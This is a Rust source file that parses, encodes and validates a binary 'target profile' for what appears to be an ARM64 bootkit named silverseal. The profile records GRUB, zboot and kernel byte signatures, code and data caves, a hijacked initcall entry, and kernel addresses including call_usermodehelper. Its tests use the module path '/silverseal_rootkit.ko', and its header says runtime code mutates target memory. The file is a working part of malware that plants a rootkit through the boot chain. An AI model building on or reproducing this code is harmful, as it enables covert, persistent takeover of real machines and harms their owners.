//! Versioned ARM64 target profile.
//!
//! A profile pins every byte signature, cave, and linked kernel address needed
//! for one exact GRUB/zboot/kernel build. Runtime code validates the complete
//! profile before it reads or mutates target memory.

pub const PROFILE_MAGIC: [u8; 8] = *b"SSARM64P";
pub const PROFILE_VERSION: u16 = 3;
pub const PROFILE_HEADER_LEN: usize = 128;
pub const FLAG_DEFERRED_ROOTFS_MODULE: u32 = 1;
pub const MAX_MODULE_PATH_LEN: usize = 96;

pub static EMBEDDED_PROFILE: &[u8] =
    include_bytes!(concat!(env!("OUT_DIR"), "/embedded-arm64-profile.bin"));

#[cfg(not(silverseal_embedded_arm64_profile))]
pub const EMBEDDED_PROFILE_IS_PLACEHOLDER: bool = true;
#[cfg(silverseal_embedded_arm64_profile)]
pub const EMBEDDED_PROFILE_IS_PLACEHOLDER: bool = false;

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum ProfileError {
    Placeholder,
    TruncatedHeader,
    BadMagic,
    UnsupportedVersion,
    InvalidHeaderLength,
    UnsupportedFlags,
    NonZeroReserved,
    EmptySignature,
    SignatureTooShort,
    InvalidOffset,
    InvalidCapacity,
    InvalidKernelLength,
    InvalidAddress,
    InvalidModulePath,
    LengthOverflow,
    LengthMismatch,
    OutputLengthMismatch,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub struct Arm64Profile<'a> {
    pub grub_signature: &'a [u8],
    pub zboot_signature: &'a [u8],
    pub initcall_signature: &'a [u8],
    pub code_cave_signature: &'a [u8],
    pub schedule_work_signature: &'a [u8],
    pub initcall_entry_offset: usize,
    pub code_cave_offset: usize,
    pub code_cave_capacity: usize,
    pub data_cave_capacity: usize,
    pub kernel_image_len: usize,
    pub initcall_entry_virtual: usize,
    pub code_cave_virtual: usize,
    pub data_cave_virtual: usize,
    pub schedule_work_virtual: usize,
    pub msleep_virtual: usize,
    pub call_usermodehelper_virtual: usize,
    pub module_path: &'a [u8],
}

impl<'a> Arm64Profile<'a> {
    pub fn parse(bytes: &'a [u8]) -> Result<Self, ProfileError> {
        if bytes.len() < 12 {
            return Err(ProfileError::TruncatedHeader);
        }
        if bytes[..8] != PROFILE_MAGIC {
            return Err(ProfileError::BadMagic);
        }
        if read_u16(bytes, 8) != PROFILE_VERSION {
            return Err(ProfileError::UnsupportedVersion);
        }
        if bytes.len() < PROFILE_HEADER_LEN {
            return Err(ProfileError::TruncatedHeader);
        }
        if usize::from(read_u16(bytes, 10)) != PROFILE_HEADER_LEN {
            return Err(ProfileError::InvalidHeaderLength);
        }
        if read_u32(bytes, 12) != FLAG_DEFERRED_ROOTFS_MODULE {
            return Err(ProfileError::UnsupportedFlags);
        }
        if bytes[32..40].iter().any(|byte| *byte != 0)
            || bytes[104..PROFILE_HEADER_LEN].iter().any(|byte| *byte != 0)
        {
            return Err(ProfileError::NonZeroReserved);
        }

        let lengths = [
            usize::from(read_u16(bytes, 16)),
            usize::from(read_u16(bytes, 18)),
            usize::from(read_u16(bytes, 20)),
            usize::from(read_u16(bytes, 22)),
            usize::from(read_u16(bytes, 24)),
            usize::from(read_u16(bytes, 30)),
        ];
        let payload_len = lengths
            .into_iter()
            .try_fold(0usize, |total, len| total.checked_add(len))
            .ok_or(ProfileError::LengthOverflow)?;
        let expected_len = PROFILE_HEADER_LEN
            .checked_add(payload_len)
            .ok_or(ProfileError::LengthOverflow)?;
        if bytes.len() != expected_len {
            return Err(ProfileError::LengthMismatch);
        }

        let mut cursor = PROFILE_HEADER_LEN;
        let mut take = |len: usize| {
            let start = cursor;
            cursor += len;
            &bytes[start..cursor]
        };
        let profile = Self {
            grub_signature: take(lengths[0]),
            zboot_signature: take(lengths[1]),
            initcall_signature: take(lengths[2]),
            code_cave_signature: take(lengths[3]),
            schedule_work_signature: take(lengths[4]),
            module_path: take(lengths[5]),
            initcall_entry_offset: usize::from(read_u16(bytes, 26)),
            code_cave_offset: usize::from(read_u16(bytes, 28)),
            code_cave_capacity: usize::try_from(read_u32(bytes, 40))
                .map_err(|_| ProfileError::InvalidCapacity)?,
            data_cave_capacity: usize::try_from(read_u32(bytes, 44))
                .map_err(|_| ProfileError::InvalidCapacity)?,
            kernel_image_len: usize::try_from(read_u64(bytes, 48))
                .map_err(|_| ProfileError::InvalidKernelLength)?,
            initcall_entry_virtual: usize::try_from(read_u64(bytes, 56))
                .map_err(|_| ProfileError::InvalidAddress)?,
            code_cave_virtual: usize::try_from(read_u64(bytes, 64))
                .map_err(|_| ProfileError::InvalidAddress)?,
            data_cave_virtual: usize::try_from(read_u64(bytes, 72))
                .map_err(|_| ProfileError::InvalidAddress)?,
            schedule_work_virtual: usize::try_from(read_u64(bytes, 80))
                .map_err(|_| ProfileError::InvalidAddress)?,
            msleep_virtual: usize::try_from(read_u64(bytes, 88))
                .map_err(|_| ProfileError::InvalidAddress)?,
            call_usermodehelper_virtual: usize::try_from(read_u64(bytes, 96))
                .map_err(|_| ProfileError::InvalidAddress)?,
        };
        profile.validate()?;
        Ok(profile)
    }

    pub fn encoded_len(&self) -> Result<usize, ProfileError> {
        self.validate()?;
        [
            self.grub_signature.len(),
            self.zboot_signature.len(),
            self.initcall_signature.len(),
            self.code_cave_signature.len(),
            self.schedule_work_signature.len(),
            self.module_path.len(),
        ]
        .into_iter()
        .try_fold(PROFILE_HEADER_LEN, |total, len| total.checked_add(len))
        .ok_or(ProfileError::LengthOverflow)
    }

    pub fn encode_into(&self, output: &mut [u8]) -> Result<(), ProfileError> {
        let encoded_len = self.encoded_len()?;
        if output.len() != encoded_len {
            return Err(ProfileError::OutputLengthMismatch);
        }
        output.fill(0);
        output[..8].copy_from_slice(&PROFILE_MAGIC);
        output[8..10].copy_from_slice(&PROFILE_VERSION.to_le_bytes());
        output[10..12].copy_from_slice(&(PROFILE_HEADER_LEN as u16).to_le_bytes());
        output[12..16].copy_from_slice(&FLAG_DEFERRED_ROOTFS_MODULE.to_le_bytes());

        for (offset, len) in [
            (16, self.grub_signature.len()),
            (18, self.zboot_signature.len()),
            (20, self.initcall_signature.len()),
            (22, self.code_cave_signature.len()),
            (24, self.schedule_work_signature.len()),
            (30, self.module_path.len()),
        ] {
            write_len_u16(output, offset, len)?;
        }
        write_len_u16(output, 26, self.initcall_entry_offset)?;
        write_len_u16(output, 28, self.code_cave_offset)?;
        output[40..44].copy_from_slice(
            &u32::try_from(self.code_cave_capacity)
                .map_err(|_| ProfileError::InvalidCapacity)?
                .to_le_bytes(),
        );
        output[44..48].copy_from_slice(
            &u32::try_from(self.data_cave_capacity)
                .map_err(|_| ProfileError::InvalidCapacity)?
                .to_le_bytes(),
        );
        output[48..56].copy_from_slice(&(self.kernel_image_len as u64).to_le_bytes());
        output[56..64].copy_from_slice(&(self.initcall_entry_virtual as u64).to_le_bytes());
        output[64..72].copy_from_slice(&(self.code_cave_virtual as u64).to_le_bytes());
        output[72..80].copy_from_slice(&(self.data_cave_virtual as u64).to_le_bytes());
        output[80..88].copy_from_slice(&(self.schedule_work_virtual as u64).to_le_bytes());
        output[88..96].copy_from_slice(&(self.msleep_virtual as u64).to_le_bytes());
        output[96..104].copy_from_slice(&(self.call_usermodehelper_virtual as u64).to_le_bytes());

        let mut cursor = PROFILE_HEADER_LEN;
        for value in [
            self.grub_signature,
            self.zboot_signature,
            self.initcall_signature,
            self.code_cave_signature,
            self.schedule_work_signature,
            self.module_path,
        ] {
            let end = cursor + value.len();
            output[cursor..end].copy_from_slice(value);
            cursor = end;
        }
        Ok(())
    }

    fn validate(&self) -> Result<(), ProfileError> {
        let signatures = [
            self.grub_signature,
            self.zboot_signature,
            self.initcall_signature,
            self.code_cave_signature,
            self.schedule_work_signature,
        ];
        if signatures.iter().any(|signature| signature.is_empty()) {
            return Err(ProfileError::EmptySignature);
        }
        if self.grub_signature.len() < 16
            || self.zboot_signature.len() < 20
            || self.initcall_signature.len() < 4
            || self.code_cave_signature.len() < 4
            || self.schedule_work_signature.len() < 20
        {
            return Err(ProfileError::SignatureTooShort);
        }
        if self
            .initcall_entry_offset
            .checked_add(4)
            .is_none_or(|end| end > self.initcall_signature.len())
        {
            return Err(ProfileError::InvalidOffset);
        }
        if self.code_cave_capacity < crate::arm64_trampoline::MIN_CODE_CAVE_CAPACITY
            || self.data_cave_capacity < crate::arm64_trampoline::MIN_DATA_CAVE_CAPACITY
        {
            return Err(ProfileError::InvalidCapacity);
        }
        if self.kernel_image_len == 0 {
            return Err(ProfileError::InvalidKernelLength);
        }
        for address in [
            self.initcall_entry_virtual,
            self.code_cave_virtual,
            self.data_cave_virtual,
            self.schedule_work_virtual,
            self.msleep_virtual,
            self.call_usermodehelper_virtual,
        ] {
            if address == 0 || !address.is_multiple_of(4) {
                return Err(ProfileError::InvalidAddress);
            }
        }
        if !self.data_cave_virtual.is_multiple_of(8) {
            return Err(ProfileError::InvalidAddress);
        }
        if self.module_path.is_empty()
            || self.module_path.len() > MAX_MODULE_PATH_LEN
            || self.module_path[0] != b'/'
            || self.module_path.contains(&0)
        {
            return Err(ProfileError::InvalidModulePath);
        }
        for len in [
            self.grub_signature.len(),
            self.zboot_signature.len(),
            self.initcall_signature.len(),
            self.code_cave_signature.len(),
            self.schedule_work_signature.len(),
            self.module_path.len(),
            self.initcall_entry_offset,
            self.code_cave_offset,
        ] {
            u16::try_from(len).map_err(|_| ProfileError::LengthOverflow)?;
        }
        Ok(())
    }
}

pub fn embedded_profile() -> Result<Arm64Profile<'static>, ProfileError> {
    if EMBEDDED_PROFILE_IS_PLACEHOLDER {
        return Err(ProfileError::Placeholder);
    }
    Arm64Profile::parse(EMBEDDED_PROFILE)
}

fn write_len_u16(output: &mut [u8], offset: usize, value: usize) -> Result<(), ProfileError> {
    let value = u16::try_from(value).map_err(|_| ProfileError::LengthOverflow)?;
    output[offset..offset + 2].copy_from_slice(&value.to_le_bytes());
    Ok(())
}

fn read_u16(bytes: &[u8], offset: usize) -> u16 {
    u16::from_le_bytes([bytes[offset], bytes[offset + 1]])
}

fn read_u32(bytes: &[u8], offset: usize) -> u32 {
    u32::from_le_bytes(bytes[offset..offset + 4].try_into().unwrap())
}

fn read_u64(bytes: &[u8], offset: usize) -> u64 {
    u64::from_le_bytes(bytes[offset..offset + 8].try_into().unwrap())
}

#[cfg(test)]
mod tests {
    extern crate std;

    use super::*;
    use std::vec;

    fn profile<'a>() -> Arm64Profile<'a> {
        Arm64Profile {
            grub_signature: &[0x11; 32],
            zboot_signature: &[0x22; 52],
            initcall_signature: &[0x33; 32],
            code_cave_signature: &[0x44; 32],
            schedule_work_signature: &[0x55; 32],
            initcall_entry_offset: 24,
            code_cave_offset: 32,
            code_cave_capacity: 256,
            data_cave_capacity: 0x7f8,
            kernel_image_len: 0x4540000,
            initcall_entry_virtual: 0xffff_8000_831c_e498,
            code_cave_virtual: 0xffff_8000_8001_0b84,
            data_cave_virtual: 0xffff_8000_843e_6808,
            schedule_work_virtual: 0xffff_8000_8003_d578,
            msleep_virtual: 0xffff_8000_8029_81b0,
            call_usermodehelper_virtual: 0xffff_8000_8015_e2f0,
            module_path: b"/silverseal_rootkit.ko",
        }
    }

    #[test]
    fn version_three_round_trips() {
        let expected = profile();
        let mut bytes = vec![0; expected.encoded_len().unwrap()];
        expected.encode_into(&mut bytes).unwrap();
        assert_eq!(Arm64Profile::parse(&bytes), Ok(expected));
    }

    #[test]
    fn rejects_legacy_versions_reserved_bytes_and_trailing_data() {
        let expected = profile();
        let mut bytes = vec![0; expected.encoded_len().unwrap()];
        expected.encode_into(&mut bytes).unwrap();

        let mut legacy = bytes.clone();
        legacy[8..10].copy_from_slice(&2_u16.to_le_bytes());
        assert_eq!(
            Arm64Profile::parse(&legacy),
            Err(ProfileError::UnsupportedVersion)
        );

        let mut reserved = bytes.clone();
        reserved[104] = 1;
        assert_eq!(
            Arm64Profile::parse(&reserved),
            Err(ProfileError::NonZeroReserved)
        );

        bytes.push(0);
        assert_eq!(
            Arm64Profile::parse(&bytes),
            Err(ProfileError::LengthMismatch)
        );
    }

    #[test]
    fn rejects_unsafe_offsets_caves_and_addresses() {
        let mut invalid = profile();
        invalid.initcall_entry_offset = invalid.initcall_signature.len();
        assert_eq!(invalid.encoded_len(), Err(ProfileError::InvalidOffset));

        invalid = profile();
        invalid.data_cave_capacity = 16;
        assert_eq!(invalid.encoded_len(), Err(ProfileError::InvalidCapacity));

        invalid = profile();
        invalid.schedule_work_virtual += 1;
        assert_eq!(invalid.encoded_len(), Err(ProfileError::InvalidAddress));

        invalid = profile();
        invalid.module_path = b"relative.ko";
        assert_eq!(invalid.encoded_len(), Err(ProfileError::InvalidModulePath));
    }

    #[test]
    fn encoding_failure_preserves_output() {
        let expected = profile();
        let mut output = [0xa5; 512];
        let before = output;
        assert_eq!(
            expected.encode_into(&mut output),
            Err(ProfileError::OutputLengthMismatch)
        );
        assert_eq!(output, before);
    }

    #[test]
    #[cfg(not(silverseal_embedded_arm64_profile))]
    fn missing_embedded_profile_fails_closed() {
        assert_eq!(embedded_profile(), Err(ProfileError::Placeholder));
    }
}
